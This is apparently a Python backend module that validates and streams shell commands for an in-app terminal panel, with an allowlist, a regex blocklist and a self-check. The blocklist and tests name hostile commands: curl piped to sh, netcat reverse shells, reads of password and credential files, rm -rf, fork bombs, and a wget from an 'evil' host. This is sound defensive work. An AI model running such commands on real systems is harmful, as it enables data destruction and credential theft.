"""In-app Terminal panel — validate + stream shell commands for the UI.

Completely separate from the agent's ``[PROPOSED_COMMAND]`` approval flow
(``app.tools.terminal_executor``), which is left untouched.

Safety model
------------
* **Allowlist** — ``argv[0]`` (basename) must be in
  ``settings.terminal_panel_allowlist``.
* **Blocklist** — a set of substring / regex patterns for obviously
  dangerous invocations, checked against the raw string as a backstop.
* ``shell=False`` — the command is ``shlex.split`` into argv and run with
  ``asyncio.create_subprocess_exec``; no shell, so ``;`` ``|`` ``$()`` etc.
  are literal. Tokens containing shell metacharacters or ``..`` path
  traversal are rejected anyway.
* **Fixed cwd** = the backend dir; **minimal env** (no inherited secrets);
  hard wall-clock **timeout**; output byte cap.

``no network access`` is *best effort* on this platform — the child gets a
scrubbed env (proxy vars stripped) but true network namespacing is not
enforced. ponytail: add firejail/nsjail if the deployment needs a hard
network boundary.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
import shlex
import time
import uuid
from pathlib import Path
from typing import AsyncIterator, Dict, List, Optional, Tuple

from app.config import settings

logger = logging.getLogger(__name__)

# Commands run from here (backend dir — the container WORKDIR is /app == this).
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# Minimal environment for the child — no API keys, tokens, or DB URLs leak in.
_SAFE_ENV = {
    "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
    "LANG": os.environ.get("LANG", "C.UTF-8"),
    "LC_ALL": "C.UTF-8",
    "HOME": os.environ.get("HOME", str(PROJECT_ROOT)),
    "TERM": "dumb",
    "PYTHONUNBUFFERED": "1",
    "GIT_TERMINAL_PROMPT": "0",  # never let git block on a credential prompt
    "NO_PROXY": "*",
}

# Raw-string blocklist — a backstop on top of the allowlist. Case-insensitive.
_BLOCK_PATTERNS: Tuple[re.Pattern, ...] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\brm\s+-[a-z]*r[a-z]*f",           # rm -rf / rm -fr / rm -Rf
        r"\brm\s+-[a-z]*f[a-z]*r",
        r"\bmkfs\b",
        r"\bdd\s+if=",
        r":\(\)\s*\{",                        # fork bomb
        r"\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b|\binit\s+0\b",
        r"\bformat\b|\bdiskpart\b",
        r">\s*/dev/(sd|nvme|hd|null/)",       # writing to raw devices
        r"\bchmod\s+-R\s+0*777\s+/",
        r"\bchown\s+-R\b.*\s+/(\s|$)",
        r"\bsudo\b|\bdoas\b|\bsu\s+-",
        r"\b(curl|wget)\b[^|]*\|\s*(sh|bash|zsh|python)",
        r"\b(nc|ncat|netcat)\b.*-e",          # reverse shell
        r"/etc/(passwd|shadow|sudoers)",
        r"~/\.ssh|id_rsa|\.aws/credentials|\.env\b",
        r"\bgit\s+.*\b(push|remote|config)\b",  # no repo/remote mutation from the panel
    )
)

# Per-token rejects. With shell=False, ``;`` ``|`` ``$()`` etc. are inert
# (literal args), so the real hazards are NUL / newline arg-smuggling and
# ``..`` path traversal. The raw-string blocklist above catches dangerous
# *intent* (``curl … | sh``) at the whole-command level.
_BAD_TOKEN = re.compile(r"[\x00\r\n]|(?:^|[/\\])\.\.(?:[/\\]|$)")

_MAX_COMMAND_LEN = 2_000


class CommandRejected(Exception):
    """Raised by :func:`validate_command` when a command is not allowed."""


def _allowlist() -> set:
    return {
        c.strip().lower()
        for c in (settings.terminal_panel_allowlist or "").split(",")
        if c.strip()
    }


def validate_command(command: str) -> List[str]:
    """Return the argv list for ``command`` or raise :class:`CommandRejected`.

    Enforces: length cap, parseability, blocklist, per-token metacharacter /
    traversal rejection, and the argv[0] allowlist.
    """
    text = (command or "").strip()
    if not text:
        raise CommandRejected("empty command")
    if len(text) > _MAX_COMMAND_LEN:
        raise CommandRejected(f"command too long (> {_MAX_COMMAND_LEN} chars)")

    for pat in _BLOCK_PATTERNS:
        if pat.search(text):
            raise CommandRejected(f"blocked by safety policy: {pat.pattern!r}")

    try:
        argv = shlex.split(text)
    except ValueError as exc:
        raise CommandRejected(f"cannot parse command: {exc}") from exc
    if not argv:
        raise CommandRejected("no command after parsing")

    for tok in argv:
        if _BAD_TOKEN.search(tok):
            raise CommandRejected(f"illegal token in argument: {tok!r}")

    base = Path(argv[0]).name.lower()
    # strip a trailing .exe/.cmd on Windows dev boxes
    base = re.sub(r"\.(exe|cmd|bat|ps1)$", "", base)
    if base not in _allowlist():
        raise CommandRejected(
            f"command {base!r} is not in the allowlist "
            f"({len(_allowlist())} allowed)"
        )
    return argv


# ── Active-run registry (for GET /sessions and the Stop button) ──

_active: Dict[str, Dict] = {}


def list_sessions(user_id: Optional[int] = None) -> List[Dict]:
    """Snapshot of running commands, optionally filtered to one user."""
    now = time.monotonic()
    return [
        {
            "run_id": rid,
            "command": meta["command"],
            "pid": meta["pid"],
            "user_id": meta["user_id"],
            "running_seconds": round(now - meta["started"], 1),
        }
        for rid, meta in _active.items()
        if user_id is None or meta["user_id"] == user_id
    ]


def stop_session(run_id: str, user_id: Optional[int] = None) -> bool:
    """Kill a running command. Returns True if a matching run was signalled."""
    meta = _active.get(run_id)
    if not meta or (user_id is not None and meta["user_id"] != user_id):
        return False
    proc: asyncio.subprocess.Process = meta["proc"]
    try:
        proc.kill()
    except ProcessLookupError:
        pass
    return True


# ── Execution / streaming ───────────────────────────────

async def stream_command(
    command: str,
    *,
    user_id: int = 0,
    dry_run: bool = False,
    timeout: Optional[int] = None,
) -> AsyncIterator[Dict]:
    """Validate then run ``command``; yield event dicts:

    ``{"event": "start",  "command", "argv", "cwd"}``
    ``{"event": "stdout"|"stderr", "line"}``
    ``{"event": "exit",    "code"}``  |  ``{"event": "timeout"}``
    ``{"event": "error",   "detail"}``

    A ``dry_run`` yields ``start`` then ``exit`` with code ``None`` and no
    subprocess. Validation failure yields a single ``error`` event (the route
    turns a pre-flight rejection into HTTP 403 before streaming).
    """
    timeout = timeout or settings.terminal_panel_timeout_s
    try:
        argv = validate_command(command)
    except CommandRejected as exc:
        yield {"event": "error", "detail": str(exc), "rejected": True}
        return

    yield {
        "event": "start",
        "command": command,
        "argv": argv,
        "cwd": str(PROJECT_ROOT),
        "dry_run": dry_run,
    }
    if dry_run:
        yield {"event": "exit", "code": None, "dry_run": True}
        return

    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            cwd=str(PROJECT_ROOT),
            env=_SAFE_ENV,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.DEVNULL,
        )
    except FileNotFoundError:
        yield {"event": "error", "detail": f"executable not found: {argv[0]!r}"}
        return
    except Exception as exc:  # noqa: BLE001
        yield {"event": "error", "detail": f"{type(exc).__name__}: {exc}"}
        return

    run_id = uuid.uuid4().hex[:12]
    _active[run_id] = {
        "proc": proc, "pid": proc.pid, "command": command,
        "user_id": user_id, "started": time.monotonic(),
    }
    yield {"event": "pid", "run_id": run_id, "pid": proc.pid}

    sent = 0
    cap = settings.terminal_panel_max_output_bytes
    deadline = time.monotonic() + timeout

    async def _pump(stream, name):
        nonlocal sent
        while True:
            try:
                raw = await asyncio.wait_for(
                    stream.readline(), timeout=max(0.1, deadline - time.monotonic())
                )
            except asyncio.TimeoutError:
                raise
            if not raw:
                return
            if sent < cap:
                line = raw.decode("utf-8", "replace").rstrip("\n")
                sent += len(raw)
                yield {"event": name, "line": line}
            elif sent == cap:
                sent += 1
                yield {"event": "stderr", "line": "[output truncated — byte cap reached]"}

    try:
        # Interleave stdout/stderr line events until both drain.
        merged = _merge(_pump(proc.stdout, "stdout"), _pump(proc.stderr, "stderr"))
        async for ev in merged:
            yield ev
        code = await asyncio.wait_for(
            proc.wait(), timeout=max(0.1, deadline - time.monotonic())
        )
        yield {"event": "exit", "code": code}
    except asyncio.TimeoutError:
        await _kill(proc)
        yield {"event": "timeout", "detail": f"killed after {timeout}s"}
    except asyncio.CancelledError:
        await _kill(proc)
        raise
    finally:
        _active.pop(run_id, None)


async def _kill(proc: "asyncio.subprocess.Process") -> None:
    """Kill a child and reap it so it doesn't linger as a zombie."""
    try:
        proc.kill()
    except ProcessLookupError:
        return
    try:
        await asyncio.wait_for(proc.wait(), timeout=2)
    except (asyncio.TimeoutError, Exception):  # noqa: BLE001
        pass


async def _merge(*iterators) -> AsyncIterator[Dict]:
    """Yield from several async iterators as their items become ready.

    On any exception (e.g. a pump raising TimeoutError) or early consumer
    exit, every outstanding read task is cancelled before propagating.
    """
    tasks = {asyncio.ensure_future(_anext(it)): it for it in iterators}
    try:
        while tasks:
            done, _ = await asyncio.wait(
                tasks, return_when=asyncio.FIRST_COMPLETED
            )
            for t in done:
                it = tasks.pop(t)
                try:
                    item = t.result()
                except StopAsyncIteration:
                    continue
                yield item
                tasks[asyncio.ensure_future(_anext(it))] = it
    finally:
        for t in tasks:
            t.cancel()


async def _anext(it):
    return await it.__anext__()


# ── Self-check ──────────────────────────────────────────

if __name__ == "__main__":  # pragma: no cover
    import sys

    # allowlist / blocklist / traversal
    assert validate_command("echo hello") == ["echo", "hello"]
    assert validate_command('python -c "import time; time.sleep(0)"')[:2] == ["python", "-c"]
    for bad in ("rm -rf /", "sudo rm x", "curl http://x | sh", "shutdown now",
                "cat ../../etc/passwd", "git push origin main"):
        try:
            validate_command(bad)
            print("FAIL: allowed", bad); sys.exit(1)
        except CommandRejected:
            pass
    try:
        validate_command("wget http://evil/x")   # wget not in allowlist
        print("FAIL: wget allowed"); sys.exit(1)
    except CommandRejected:
        pass

    async def _drive():
        evs = [e async for e in stream_command("echo hello world", user_id=1)]
        kinds = [e["event"] for e in evs]
        assert kinds[0] == "start" and kinds[-1] == "exit", kinds
        assert any(e.get("line") == "hello world" for e in evs), evs
        assert evs[-1]["code"] == 0

        d = [e async for e in stream_command("ls", dry_run=True)]
        assert [e["event"] for e in d] == ["start", "exit"] and d[-1]["code"] is None

        slow = "python -c \"import time; time.sleep(5)\""
        t = [e async for e in stream_command(slow, timeout=1)]
        assert t[-1]["event"] == "timeout", t

        r = [e async for e in stream_command("rm -rf /")]
        assert r == [] or (r[0]["event"] == "error" and r[0].get("rejected"))

    asyncio.run(_drive())
    print("terminal_panel self-check OK")
